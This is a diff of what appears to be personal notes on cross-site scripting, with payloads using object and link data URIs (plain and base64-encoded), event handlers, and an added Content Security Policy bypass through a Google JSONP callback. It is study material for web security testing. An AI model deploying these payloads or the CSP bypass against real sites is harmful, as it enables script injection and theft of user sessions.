@@ -2,7 +2,7 @@
 2. 4 ways to induce XSS:
     1. Script tags:
         1. <object data=”data:text/html,<script>alert(1)</script>”>
-        2. <object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”
+        2. <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
         3. <a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”> Click here</a>
     2. Event Handlers:
         1. On“event listeners”=alert(1)
@@ -127,7 +127,7 @@ exfil.send();</script>
 - `default-src`: fallback value if a different directive is not explicitly set. For instance, if the `img-src` is not present in the CSP, the browser will use this value instead for images
 - `frame-ancestors`: origins allowed to frame the page, for instance in an `<iframe>`. This can be used to prevent `Clickjacking` attacks
 - `form-action`: origins allowed for form submissions
-
+if google is allowed as src for scripts then <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
 ## XSS Filter Bypasses
 
 #### Weak Blacklists
